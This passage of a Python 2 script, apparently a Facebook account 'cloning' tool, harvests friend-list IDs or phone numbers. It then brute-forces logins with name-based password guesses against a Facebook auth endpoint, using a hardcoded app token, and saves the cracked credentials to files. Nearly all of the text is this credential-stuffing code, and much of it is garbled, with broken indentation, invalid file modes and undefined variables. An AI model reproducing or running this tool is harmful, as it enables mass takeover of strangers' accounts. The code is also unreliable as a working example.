										print '\x1b[1;92mHacked 100%💉\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in s["error_msg"]:
											print '\x1b[1;91m24Hours\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass4
											cek = open("out/checkpoint.txt", "k")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = y['first_name'] + '786'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											s = json.load(data)
											if 'access_token' in s:
												print '\x1b[1;92mHacked 100%💉\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass5
												oks.append(user+pass5)
												else:
												if 'www.facebook.com' in s["error_msg"]:
													print '\x1b[1;91m24Hours\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass5
													cek = open("out/checkpoint.txt", "k")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = y['first_name'] + y['last_name']
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													s = json.load(data)
													if 'access_token' in s:
														print '\x1b[1;92mHacked 100%💉\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in s["error_msg"]:
															print '\x1b[1;91m24Hours\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass6
															cek = open("out/checkpoint.txt", "k")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = y['first_name'] + '1234'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															s = json.load(data)
															if 'access_token' in s:
																print '\x1b[1;92mHacked 100%💉\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in s["error_msg"]:
																	print '\x1b[1;91m24Hours\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass7
																	cek = open("out/checkpoint.txt", "k")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
													
													
													except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mAlex Shohan\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
	print "  \033[1;91m«---•◈•---Developed By Alex Shohan-Scripts--•◈•---»" #Dev:Alex Shohan
	print '\033[1;95mProcess Has Been Completed Press➡ Type 0 Enter↩ Next Type 0 (Back)↩\033[1;97m....'
        print '\033[1;95mNext Type (python2 Indiaa) Next login facebook Start Cloning\033[1;97m....'
	print"\033[1;92mTotal Hacked/\x1b[1;91mCheckPoint \033[1;93m: \033[1;92m"+str(len(oks))+"\033[1;95m/\033[1;91m"+str(len(cekpoint))
	print """
	_____                                    __           
   |     \                                 |  \         
    \$$$$  ______    _______  ______ ____   \$ _______  
      | $$ /      \ /       \      \   \|  \       \
 __   | $$|  $$$$$$\  $$$$$$$| $$$$$$\$$$\ $$| $$$$$$$\|  \ | $$| $$    $$ \$    \| $$ | $$ | $$| $$| $$  | $$
| $$__| $$| $$$$$$$$ _\$$$$$\ $$ | $$ | $$| $$| $$  | $$
 \$    $$ \$     \       $$| $$ | $$ | $$| $$| $$  | $$
  \$$$$$   \$$$$$$ \$$$$$$  \$  \$  \$ \$ \$   \$
  
   Don't Worry CheckPoint ID Will Be Open After 24Hours 

•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
: \033[1;91m .......Alex Shohan...... \033[1;95m :
•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                  Telegrame Number
              \033[1;91m +8801406876761"""
	
	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
	crack()
	
	def hack():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo3
	print "\033[1;97m-•◈•-\033[1;97m> \033[1;91m1.\x1b[1;96mClone Friend List Public ID."
        time.sleep(0.05)
	print "\033[1;97m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91mBack"
	pilih_hack()

def pilih_hack():
	peak = raw_input("\n\033[1;91mChoose an Option>>> \033[1;95m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_hack()
	elif peak =="1":
		os.system('clear')
		print logo
			idt = raw_input("\033[1;95m[•◈•] \033[1;91mEnter ID\033[1;95m: \033[1;95m")
		print "\033[1;97m✮❂❂❂❂❂❂❂❂❂❂❂❂✮\033[1;91mAlex Shohan\033[1;97m✮❂❂❂❂❂❂❂❂❂❂❂❂✮"
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;91mName\033[1;95m:\033[1;95m "+op["name"]
		except KeyError:
			print"\x1b[1;91mID Not Found!"
			raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
			hack()
		print"\033[1;91mGetting IDs\033[1;97m..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		crack()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_hack()
	
	print "\033[1;95mTotal IDs\033[1;91m: \033[1;95m"+str(len(id))
	jalan('\033[1;91mPlease Wait\033[1;94m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m«-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m------------------»"
	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
        jalan(' \033[1;95m         Start Cloning Indonasia ')
	print "\033[1;97m✮❂❂❂❂❂❂❂❂❂❂❂❂✮\033[1;91mAlex Shohan\033[1;97m✮❂❂❂❂❂❂❂❂❂❂❂❂✮033[1;97m«--------------------\033[1;92m▣\033[1;97m------------------»"
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:Alex Shohan
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = ('Kantol123')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92mHacked 100%💉\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;91m24Hours\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass1
					cek = open("out/checkpoint.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
					else:
					pass2 = 'Sayang123'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;92mHacked 100%💉\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;91m24Hours\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass2
							cek = open("out/checkpoint.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;92mHacked 100%💉\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
								    print '\x1b[1;91m24Hours\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass3
									cek = open("out/checkpoint.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = b['first_name'] + '123'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;92mHacked 100%💉\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;91m24Hours\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass4
											cek = open("out/checkpoint.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = b['first_name'] + '12'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;92mHacked 100%💉\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;91m24Hours\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass5
													cek = open("out/checkpoint.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['first_name'] + b['last_name']
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;92mHacked 100%💉\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
												
												print '\x1b[1;91m24Hours\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass6
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = b['first_name'] + '1234'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;92mHacked 100%💉\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;91m24Hours\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass7
																	cek = open("out/checkpoint.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)		
											                                       
																	
															
		except:
			pass
			
				p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;97m✮❂❂❂❂❂❂❂❂❂❂❂❂✮\033[1;91mAlex Shohan\033[1;97m✮❂❂❂❂❂❂❂❂❂❂❂❂✮"
	print "  \033[1;91m«---•◈•---Developed By Alex Shohan-Scripts--•◈•---»" #Dev:Alex-Shohan
	print '\033[1;95mProcess Has Been Completed Press➡ Type 0 Enter↩ Next Type 0 (logout)↩\033[1;97m....'
        print '\033[1;95mNext Type (python2 Indiaa) Next login facebook Start Cloning\033[1;97m....'
	print"\033[1;92mTotal Hacked/\x1b[1;91m24Hours \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
	print """
	
██╗      ██████╗ ██╗   ██╗███████╗    ██╗   ██╗ ██████╗ ██╗   ██╗
██║     ██╔═══██╗██║   ██║██╔════╝    ╚██╗ ██╔╝██╔═══██╗██║   ██║
██║     ██║   ██║██║   ██║█████╗       ╚████╔╝ ██║   ██║██║   ██║
██║     ██║   ██║╚██╗ ██╔╝██╔══╝        ╚██╔╝  ██║   ██║██║   ██║
███████╗╚██████╔╝ ╚████╔╝ ███████╗       ██║   ╚██████╔╝╚██████╔╝
╚══════╝ ╚═════╝   ╚═══╝  ╚══════╝       ╚═╝    ╚═════╝  ╚═════╝ 
                                                                 Don't Worry Your CheckPoint ID Will Be Open After 24Hours 

•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
: \033[1;91m .......Alex Shohan......... \033[1;95m :
•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                Telegrame Number
              \033[1;91m +8801406876761"""
	
	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
	crack()
	
	def freak():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo10
	print "\033[1;97m-•◈•-\033[1;97m> \033[1;91m1.\x1b[1;93mClone Friend List Public ID."
        time.sleep(0.05)
	print "\033[1;97m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91mBack"
	pilih_freak()

def pilih_freak():
	peak = raw_input("\n\033[1;91mChoose an Option>>> \033[1;95m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_freak()
	elif peak =="1":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;95m[•◈•] \033[1;91mEnter ID\033[1;95m: \033[1;95m")
		print "\033[1;97m✮❂❂❂❂❂❂❂❂❂❂❂❂✮\033[1;91mAlex Shohan\033[1;97m✮❂❂❂❂❂❂❂❂❂❂❂❂✮"
		try:
		    		os.mkdir('out')
		except OSError:
			pass #Dev:Alex Shohan
		try:
			g = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			l = json.loads(a.text)
			pass1 = l['first_name']+'Khan'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			e = json.load(data)
			if 'access_token' in e:
				print '\x1b[1;92mHacked 100%💉\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in e["error_msg"]:
					print '\x1b[1;91m24Hours\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass1
					cek = open("out/checkpoint.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = l['first_name']+'gupta'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					e = json.load(data)
					if 'access_token' in e:
						print '\x1b[1;92mHacked 100%💉\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in e["error_msg"]:
							print '\x1b[1;91m24Hours\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass2
							cek = open("out/checkpoint.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = l['first_name'] + '12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							e = json.load(data)
							if 'access_token' in e:
								print '\x1b[1;92mHacked 100%💉\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in e["error_msg"]:
									print '\x1b[1;91m24Hours\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass3
									cek = open("out/checkpoint.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = l['first_name'] + '123'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									e = json.load(data)
									if 'access_token' in e:
										print '\x1b[1;92mHacked 100%💉\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in e["error_msg"]:
											print '\x1b[1;91m24Hours\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass4
											cek = open("out/checkpoint.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = l['first_name'] + 'thakur'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											e = json.load(data)
											if 'access_token' in e:
												print '\x1b[1;92mHacked 100%💉\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in e["error_msg"]:
													print '\x1b[1;91m24Hours\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass5
													cek = open("out/checkpoint.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = l['first_name'] + l['last_name']
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													e = json.load(data)
													if 'access_token' in e:
														print '\x1b[1;92mHacked 100%💉\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in e["error_msg"]:
															print '\x1b[1;91m24Hours\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass6
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = l['first_name']+'sharma'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															e = json.load(data)
															if 'access_token' in e:
																print '\x1b[1;92mHacked 100%💉\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in e["error_msg"]:
																	print '\x1b[1;91m24Hours\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass7
																	cek = open("out/checkpoint.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;97m✮❂❂❂❂❂❂❂❂❂❂❂❂✮\033[1;91mWhite-Tiger-Komail\033[1;97m✮❂❂❂❂❂❂❂❂❂❂❂❂✮"
	print "  \033[1;91m«---•◈•---Developed By Alex Shohan-Scripts--•◈•---»" #Dev: Alex Shohan
	print '\033[1;95mProcess Has Been Completed Press➡ Type 0 Enter↩ Next Type 0 (logout)↩\033[1;97m....'
	
	def FreakedDudex():
	os.system('clear')
	print logo2
	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;96m[4]  India     \033[1;91m☆.\x1b[1;96m[17]  Denmark'
        time.sleep(0.05)
        print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;91m[0]  Back            '
        time.sleep(0.05)
	print 45*'-'
	action()
	
	def action():
	FreakedDudex = raw_input('\n\033[1;91mChoose an Option>>> \033[1;95m')
	if FreakedDudex =='':
		print '[!] Fill in correctly'
		action()
	elif FreakedDudex =="1":
                print (logo3)
		os.system("clear")
		print (logo1)
		print("\905,975,755,855,954, 897, 967, 937, 700, 727, 965, 786, 874, 856, 566, 590, 527, 568, 578")
		try:
			c = raw_input(" \033[1;95mchoose code  : ")
			k="+91"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			FreakedDudex()
	elif FreakedDudex =="4":
	    login()
	else:
		print '[!] Fill in correctly'
		action()
		
		xxx = str(len(id))
	jalan ('[✓] Total Numbers: '+xxx)
	time.sleep(0.05)
	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
	time.sleep(0.05)
	jalan ('[!] To Stop Process Press CTRL Then Press z')
	time.sleep(0.05)
	print 44*'-'
	print (logo3)
	
			
	def main(arg):
		global cpb,oks
		user = arg
		try:
			os.mkdir('save')
		except OSError:
			pass
		try:
			pass1 = user
			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92m{Hacked 100%💉}  ' + k + c + user + '  》  ' + pass1+'\n'+"\n"
				okb = open('save/successfull.txt', 'a')
				okb.write(k+c+user+'-•◈•-'+pass1+'\n')
				okb.close()
				oks.append(c+user+pass1)
			else:
				if 'www.facebook.com' in q['error_msg']:
					print '\033[1;96m[24Hours] ' + k + c + user + '  》  ' + pass1+'\n'
					cps = open('save/checkpoint.txt', 'a')
					cps.write(k+c+user+'-•◈•-'+pass1+'\n')
					cps.close()
					cpb.append(c+user+pass1)
 				else:
 				    pass2="786786"
 				    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 				    q = json.load(data)
 				    if 'access_token' in q:
 				        print '\x1b[1;92m{Hacked 100%💉}  ' + k + c + user + '  》  ' + pass2+'\n'+"\n"
 				        okb = open('save/successfull.txt', 'a')
 				        okb.write(k+c+user+'-•◈•-'+pass2+'\n')
 				        okb.close()
 				        oks.append(c+user+pass2)
 				    else:
 				        if 'www.facebook.com' in q['error_msg']:
 					        print '\033[1;96m[24Hours] ' + k + c + user + '  》  ' + pass2+'\n'
 					        cps = open('save/checkpoint.txt', 'a')
 					        cps.write(k+c+user+'-•◈•-'+pass2+'\n')
 					        cps.close()
 					        cpb.append(c+user+pass2)
                                        else:
 				            pass3="Pakistan"
 				            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 				            q = json.load(data)
 				            if 'access_token' in q:
 				                print '\x1b[1;92m{Hacked 100%💉}  ' + k + c + user + '  》  ' + pass3+'\n'+"\n"
 				                okb = open('save/successfull.txt', 'a')
 				                okb.write(k+c+user+'-•◈•-'+pass3+'\n')
 				                okb.close()
 				                oks.append(c+user+pass3)
 				            else:
 				                if 'www.facebook.com' in q['error_msg']:
 					                print '\033[1;96m[24Hours] ' + k + c + user + '  》  ' + pass3+'\n'
 					                cps = open('save/checkpoint.txt', 'a')
 					                cps.write(k+c+user+'-•◈•-'+pass3+'\n')
 					                cps.close()
 					                cpb.append(c+user+pass3)
                                                else:
 				                    pass4="Pakistan786"
 				                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 				                    q = json.load(data)
 				                    if 'access_token' in q:
 				                        print '\x1b[1;92m{Hacked 100%💉}  ' + k + c + user + '  》  ' + pass4+'\n'+"\n"
 				                        okb = open('save/successfull.txt', 'a')
 				                        okb.write(k+c+user+'-•◈•-'+pass4+'\n')
 				                        okb.close()
 				                        oks.append(c+user+pass4)
 				                    else:
 				                        if 'www.facebook.com' in q['error_msg']:
 					                        print '\033[1;96m[24Hours] ' + k + c + user + '  》  ' + pass4+'\n'
 					                        cps = open('save/checkpoint.txt', 'a')
 					                        cps.write(k+c+user+'-•◈•-'+pass4+'\n')
 					                        cps.close()
 					                        cpb.append(c+user+pass4)
																	
															
